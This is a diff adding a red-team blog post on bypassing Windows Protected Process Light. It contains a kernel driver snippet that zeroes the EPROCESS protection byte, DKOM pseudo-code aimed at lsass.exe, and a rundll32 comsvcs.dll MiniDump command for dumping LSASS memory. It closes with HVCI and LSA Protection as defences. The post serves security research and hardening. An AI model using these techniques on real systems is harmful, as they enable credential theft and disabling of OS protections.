@@ -1,0 +1,192 @@
+---
+title: "Windows Protected Processes Series: Part 3 - Advanced Evasion"
+description: "The final chapter on Protected Processes. We dissect PPLUnprotect, analyze KnownDLLs hijacking, write a custom research driver to patch EPROCESS structures, and explore why HVCI changes the game."
+date: "2025-12-20"
+author: "Mohamed Habib Jaouadi"
+tags: ["windows-internals", "ppl-bypass", "kernel-exploitation", "rootkits", "red-teaming", "hvci", "credential-theft"]
+banner: "/banners/posts/windows-protected-processes-part3.jpg"
+bannerAlt: "Glitch art style representing a bypassed security barrier"
+visibility: "private"
+series: "Windows Protected Processes Series"
+seriesOrder: 3
+---
+
+> **⚠️ Educational Disclaimer:** This content involves kernel-level manipulation and advanced evasion techniques. It is intended for authorized security research, red teaming, and system hardening. Unauthorized use of these techniques on systems you do not own is illegal.
+
+## Introduction
+
+In [Part 1](/posts/windows-protected-processes-part1), we established the "hard barriers" of the Protected Process (PPL) model: how the kernel blocks even Administrators from touching processes like `csrss.exe` and `lsass.exe`. In [Part 2](/posts/windows-protected-processes-part2), we explored inspection tools and the standard "Pass-the-Hash" workflow.
+
+Now, we break the barriers.
+
+When a Red Teamer encounters a fully hardened Windows environment—CredGuard enabled, PPL active, EDR monitoring—standard tools like Mimikatz userspace credential dumping will fail. To succeed, we must move to **Ring 0**. This post covers the advanced tradecraft used to dismantle these protections from the inside out.
+
+---
+
+## 1. Direct Kernel Object Manipulation (DKOM)
+
+The most direct way to bypass PPL is to simply "turn it off." Since PPL status is just a set of bits in a kernel structure, if we have kernel memory write access (via a vulnerable driver or our own driver), we can zero out those bits.
+
+### The target: EPROCESS Structure
+Every running process is represented in the kernel by an `EPROCESS` structure. This structure contains the `PS_PROTECTION` field we analyzed in Part 1.
+
+```c
+// Offset 0x87a on Windows 10 21H2 (varies by build)
+kd> dt nt!_EPROCESS Protection ffffe001`49b22080
+   +0x87a Protection : _PS_PROTECTION
+```
+
+If we change this value to `0`, the kernel immediately treats the process as unprotected.
+
+<ProtectedProcessBypass />
+
+### Tool Analysis: PPLUnprotect / PPLKiller
+
+Tools like **PPLKiller** and **PPLUnprotect** automate this:
+1.  **Driver Load**: They load a vulnerable driver (e.g., `RTCore64.sys`) to gain an Arbitrary Write Primitive.
+2.  **Enum Processes**: They walk the active process list (`PsActiveProcessHead`) to find `lsass.exe`.
+3.  **Patch**: They calculate the offset of the `Protection` byte based on the OS build version and write `0x00` to it.
+
+Once patched, any tool—even a standard Task Manager—can access the process.
+
+<CollapsibleCode language="cpp" title="Conceptual DKOM Logic (Pseudo-code)">
+
+```cpp
+// 1. Locate Target Process (e.g., LSASS)
+PEPROCESS TargetProcess = FindProcessByName("lsass.exe");
+
+// 2. Calculate Protection Offset (Version Dependent!)
+// Windows 10 1903+ offset is typically around 0x87A
+ULONG_PTR ProtectionOffset = GetProtectionOffset(GetKernelVersion());
+
+// 3. The "Magic" Patch
+// We zero out the byte that defines the protection level
+// This turns PPL-WinTcb (level 61) into PPL-None (level 0)
+WriteKernelMemory(
+    (ULONG_PTR)TargetProcess + ProtectionOffset, 
+    0x00, 
+    sizeof(UCHAR)
+);
+
+printf("[+] PPL Removed. You may now dump credentials.\n");
+```
+
+</CollapsibleCode>
+
+---
+
+## 2. Hijacking KnownDLLs
+
+If we cannot load a driver, can we still inject code? **KnownDLLs Hijacking** is a technique that exploits how Windows caches system DLLs, but it requires specific weak configurations.
+
+### The Mechanism
+To improve performance, Windows pre-loads common system DLLs (like `kernel32.dll`, `negotiate.dll`) into memory sections under the object directory `\KnownDLLs`. When a process starts, the loader checks this directory first.
+
+If an attacker can write to this directory, they can map a malicious DLL as a "Known DLL." When a protected process subsequently starts and maps its dependencies, it will unknowingly map the malicious code *before* verifying the signature in some edge cases (though modern PPL validation usually catches this).
+
+**Mitigation**: Windows now protects the `\KnownDLLs` object directory with a specific DACL that writes only allowing `TrustedInstaller`. However, on older systems or misconfigured environments where ACLs are weak, this remains a viable user-mode escalation path.
+
+---
+
+## 3. Developing a Research Driver
+
+Writing your own kernel driver is the ultimate way to understand these internals. For research, we can create a "minimal" driver that exposes an IOCTL to strip PPL protection.
+
+**Requirements:**
+*   **Visual Studio** with **WDK (Windows Driver Kit)**.
+*   **Test Signing Mode**: Since we don't have an EV certificate, we must enable `bcdedit /set testsigning on`.
+
+<CollapsibleCode language="cpp" title="Minimal Driver: Stripping PPL Protection">
+
+```cpp
+#include <ntifs.h>
+#include <wdm.h>
+
+// Process structure definitions (simplified)
+// Offsets must be dynamic in production code!
+#define PROTECTION_OFFSET_WIN10_21H2 0x87a 
+
+DRIVER_INITIALIZE DriverEntry;
+DRIVER_UNLOAD DriverUnload;
+
+// IOCTL Handler
+NTSTATUS DeviceControl(
+    PDEVICE_OBJECT DeviceObject,
+    PIRP Irp
+) {
+    PIO_STACK_LOCATION stack = IoGetCurrentIrpStackLocation(Irp);
+    ULONG controlCode = stack->Parameters.DeviceIoControl.IoControlCode;
+    
+    if (controlCode == IOCTL_STRIP_PPL) {
+        ULONG pid = *(PULONG)Irp->AssociatedIrp.SystemBuffer;
+        PEPROCESS process;
+        
+        // 1. Get EPROCESS from PID
+        if (NT_SUCCESS(PsLookupProcessByProcessId((HANDLE)pid, &process))) {
+            
+            // 2. Direct Kernel Modification
+            // Dangerous! If offset is wrong, BSOD ensues.
+            PCHAR pBase = (PCHAR)process;
+            pBase[PROTECTION_OFFSET_WIN10_21H2] = 0; // The Patch
+            
+            ObDereferenceObject(process);
+            DbgPrint("Process %lu PPL stripped!\n", pid);
+        }
+    }
+    
+    IoCompleteRequest(Irp, IO_NO_INCREMENT);
+    return STATUS_SUCCESS;
+}
+```
+
+</CollapsibleCode>
+
+> **Note**: Loading this requires disabling Secure Boot or enabling Test Mode, which makes it distinct from a BYOVD attack that uses *signed* drivers.
+
+---
+
+## 4. The Game Changer: HVCI & VBS
+
+Everything we just discussed—patching `EPROCESS`, DKOM via vulnerable drivers—has a hard stop: **Hypervisor-Protected Code Integrity (HVCI)**.
+
+### Immutability via Virtualization
+When VBS (Virtualization-Based Security) is enabled, the OS runs on top of a hypervisor. The hypervisor can mark certain kernel memory pages as **Associate-Immutable**. 
+
+Even if you have a kernel driver with Ring 0 access (the highest privilege level in the OS), you cannot write to these protected pages.
+*   If you try to write to the `EPROCESS` protection bits on an HVCI-enabled system, the hypervisor intercepts the write.
+*   It sees a violation of Code Integrity.
+*   It triggers a **Bug Check (BSOD)** immediately to protect the system integrity.
+
+This effectively kills the "PPLKiller" class of tools on modern Secured-core PCs, pushing attackers to find bugs in the hypervisor itself or legacy compatibility shims.
+
+---
+
+## 5. Defensive Evasion "Living off the Land"
+
+Sometimes, you don't need to disable PPL. You simply need to use a tool that PPL *trusts*.
+
+### Leveraging Microsoft Signed Binaries
+PPL-Antimalware processes (like Windows Defender) can access other processes. Occasionally, administration tools are signed with levels that grant them surprising access.
+
+*   **ProcDump**: A Sysinternals tool legitimized by Microsoft signatures. While it generally respects PPL, versions of it have historically been used to dump memory in ways that bypass simpler user-mode hooks.
+*   **Comsvcs.dll**: The famous "Minidump" export. Attackers use `rundll32` to call `MiniDumpW`.
+    ```powershell
+    rundll32.exe C:\Windows\System32\comsvcs.dll, MiniDump <PID> lsass.dmp full
+    ```
+    Against a standard PPL-Lsa process, this fails. But if the attacker can elevate to a **System** process that shares the PPL-Lsa signer (rare but possible via token manipulation), they can execute this dump natively.
+
+---
+
+## Conclusion
+
+The Windows Protected Process model is a fascinating cat-and-mouse game.
+*   **Level 1**: Security via Obscurity (User-mode hooks). Bypassed by Manual Syscalls.
+*   **Level 2**: Kernel Enforcement (PPL). Bypassed by Vulnerable Drivers (BYOVD).
+*   **Level 3**: Hardware Enforcement (HVCI/VBS). This is the current frontier. Code running in simple Ring 0 is no longer "God Mode." 
+
+For defenders, enabling **HVCI** and **LSA Protection** is the single most effective step to neutralizing 99% of the credential theft techniques discussed in this series.
+
+### Series Recap
+*   [Part 1: The Model](/posts/windows-protected-processes-part1) (Theory & Limitations)
+*   [Part 2: Inspection](/posts/windows-protected-processes-part2) (Process Hacker & WinDbg)
+*   [Part 3: Evasion](/posts/windows-protected-processes-part3) (Drivers & Exploitation)
